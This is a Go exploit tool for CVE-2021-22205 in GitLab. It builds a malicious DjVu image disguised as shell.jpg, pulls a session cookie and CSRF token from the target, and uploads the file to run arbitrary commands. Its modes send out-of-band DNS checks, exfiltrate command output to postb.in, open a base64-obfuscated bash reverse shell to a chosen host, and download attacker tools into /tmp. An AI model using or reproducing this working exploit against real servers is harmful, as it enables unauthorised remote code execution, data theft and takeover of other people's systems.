package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
)

type PostbinJson struct {
	BinID   string `json:"binId"`
	Now     int64  `json:"now"`
	Expires int64  `json:"expires"`
}


func RegerpGitlabSession(SetCookie string) string{
	regMap, _ := regexp.Compile(`_gitlab_session=(.*?);`)
	resultMap := regMap.FindStringSubmatch(SetCookie)
	return resultMap[0]
}

func RegerpGitlabCsrfToken(Body string) string{
	regMap, _ := regexp.Compile(`<meta name="csrf-token" content="(.*?)" />`)
	resultMap := regMap.FindStringSubmatch(Body)
	return resultMap[1]
}

func getCoAndTo(Url string) map[string]string {

	InfoList := make(map[string]string)

	address := Url+"/help"
	transCfg := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
	}

	httpClient := &http.Client{
		Transport: transCfg,
	}

	resp,respError:= httpClient.Get(address)
	if respError != nil{
		fmt.Printf("[-] Get cookie and csrf-token fail :%v",respError)
	}
	SetCookie := resp.Header.Get("Set-Cookie")
	InfoList["_gitlab_session"] = RegerpGitlabSession(SetCookie) //get gitlab_session

	body, bodyErr := ioutil.ReadAll(resp.Body)
	if bodyErr != nil{
		fmt.Printf("[-] Get cookie and csrf-token fail :%v",bodyErr)
	}
	defer resp.Body.Close()
	InfoList["csrf_token"] = RegerpGitlabCsrfToken(string(body))
	return InfoList
}

func BytesCombine(pBytes ...[]byte) []byte {
	return bytes.Join(pBytes, []byte(" "))
}

func FileGenerate(exec_cmd string){
	file_header := "QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs="
	file_root := "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
	file_header_d,_ := base64.StdEncoding.DecodeString(file_header)
	file_root_d,_ := base64.StdEncoding.DecodeString(file_root)
	strbytes := []byte(exec_cmd)

	bytes_a := BytesCombine(file_header_d,strbytes,file_root_d)

	err2 := ioutil.WriteFile("./shell.jpg", bytes_a, 0666)
	if err2 != nil {
		fmt.Println("[-] Genertate File fail")
	}
}

func RegerpDnsLogDomain(SetCookie string) string{
	regMap, _ := regexp.Compile(`PHPSESSID=(.*?);`)
	resultMap := regMap.FindStringSubmatch(SetCookie)
	return resultMap[0]
}

//DnsLog
func GetDnsLogRecoder(PHPSESSID string){
	DnsLogClient := http.Client{}
	req,_:= http.NewRequest(http.MethodGet,"http://www.dnslog.cn/getrecords.php",nil)
	req.Header.Set("Cookie",PHPSESSID)
	resp,_ := DnsLogClient.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)

	if len(string(body)) != 0 {
		fmt.Printf("[+] DnsLog : %s\n",string(body))
		fmt.Println("[*] Exists CVE-2021-22205")
	}else {
		fmt.Println("[-] No CVE-2021-22205")
	}
}

func GetDnsLogDomain() map[string]string{
	InfoList := make(map[string]string)
	DnsLogClient := http.Client{}
	resp,_ := DnsLogClient.Get("http://www.dnslog.cn/getdomain.php")
	InfoList["PHPSESSID"] = RegerpDnsLogDomain(resp.Header.Get("Set-Cookie"))
	body, _ := ioutil.ReadAll(resp.Body)
	InfoList["DnslogDoamin"] = string(body)
	return InfoList
}

//Postbin
func GetPostBin() string {
	PostBinClient := http.Client{}
	resp,_ := PostBinClient.Post("https://postb.in/api/bin","",nil)
	body,_ := ioutil.ReadAll(resp.Body)
	var response PostbinJson
	json.Unmarshal(body, &response)
	return  response.BinID
}
func GetPostbinShift(postbinId string) {
	resultMap:=make(map[string]interface{})
	PostBinShiftClient := http.Client{}
	resp,_:=PostBinShiftClient.Get(fmt.Sprintf("https://postb.in/api/bin/%s/req/shift",postbinId))
	body,_ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(body,&resultMap)
	a := resultMap["body"].(map[string]interface{})
	for k, _ := range a {
		result,_ :=hex.DecodeString(k)
		fmt.Println(string(result))
	}
}

func RequestPrepare(httpClient http.Client,address string,info map[string]string){
	bodyBuf := &bytes.Buffer{}
	bodyWrite := multipart.NewWriter(bodyBuf)
	file,err := os.Open("shell.jpg")
	if err != nil {
		fmt.Println("[-] Error")
	}

	fileWrite,err := bodyWrite.CreateFormFile("file","img.jpg")
	_, err = io.Copy(fileWrite, file)
	if err != nil {
		log.Println("err")
	}
	bodyWrite.Close()
	contentType := bodyWrite.FormDataContentType()
	req, err := http.NewRequest(http.MethodPost, address, bodyBuf)
	if err != nil {
		log.Println("err")
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("cookie",info["_gitlab_session"])
	req.Header.Set("X-Csrf-Token",info["csrf_token"])
	httpClient.Do(req)
}

func GitLabAttack(Url string,info map[string]string,Method string,exec_cmd string,ip string,port string,RemoteIp string,Tool string){
	address := 	Url+"/uploads/user"

	transCfg := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
	}

	httpClient := &http.Client{
		Transport: transCfg,
	}

	if Method == "detect" {
		fmt.Println("[+] detect Mode DnsLog")
		DnsLogInfo := GetDnsLogDomain()
		FileGenerate(fmt.Sprintf("curl %s",DnsLogInfo["DnslogDoamin"]))
		RequestPrepare(*httpClient,address,info)
		GetDnsLogRecoder(DnsLogInfo["PHPSESSID"])
	}

	if Method == "rce1" {
		Postbin_id := GetPostBin()
		fmt.Println("[+] RCE Mode Postbi-OOB ==> Postbin_id:"+Postbin_id)
		cmd := []byte(fmt.Sprintf("( %s ) | xxd -ps -c 200 | tr -d '\n'",exec_cmd))
		encoded := base64.StdEncoding.EncodeToString(cmd)
		b64_cmd := fmt.Sprintf("echo %s | base64 -d | /bin/bash",encoded)
		exec_cmd := fmt.Sprintf("curl -k -d `%s` https://postb.in/%s",b64_cmd,Postbin_id)
		FileGenerate(exec_cmd)
		RequestPrepare(*httpClient,address,info)
		GetPostbinShift(Postbin_id)
	}

	if Method == "rev" {
		fmt.Println("[+] Reverse Shell Mode")
		cmd := []byte(fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1",ip,port))
		fmt.Printf("[+] Reverse Shell toward %s:%s ",ip,port)
		encoded := base64.StdEncoding.EncodeToString(cmd)
		b64_cmd := fmt.Sprintf("echo %s | base64 -d | /bin/bash",encoded)
		FileGenerate(b64_cmd)
		RequestPrepare(*httpClient,address,info)
	}

	if Method == "upload" {
		fmt.Println("[+] Upload Tool Mode")
		cmd := []byte(fmt.Sprintf("curl http://%s/%s -o /tmp/%s && chmod R /tmp/%s ",RemoteIp,Tool,Tool,Tool))
		fmt.Printf("[+] %s is uploaded to /tmp",Tool)
		encoded := base64.StdEncoding.EncodeToString(cmd)
		b64_cmd := fmt.Sprintf("echo %s | base64 -d | /bin/bash",encoded)
		FileGenerate(b64_cmd)
		RequestPrepare(*httpClient,address,info)
	}

}


func main(){
	TargetUrl := flag.String("target","https://10.10.10.10","Target Url (eg: -target https://10.10.10.10)")
	Method := flag.String("m","detect","Method for using of CVE-2021-22205 eg:-m detect|rce1|reverse-shell|upload")
	exec_cmd := flag.String("c","id","exec cmd eg: -c \"id\"")
	ip := flag.String("host","","reverse shell host")
	port := flag.String("port","","reverse shell port")
	RemoteIp := flag.String("R","","VPS to load tools eg: -R 127.0.0.1:8083")
	Tool := flag.String("T","","Tool name eg: -T fscan")
	flag.Parse()
	HeaderInfo := getCoAndTo(*TargetUrl)
	GitLabAttack(*TargetUrl,HeaderInfo,*Method,*exec_cmd,*ip,*port,*RemoteIp,*Tool)



}
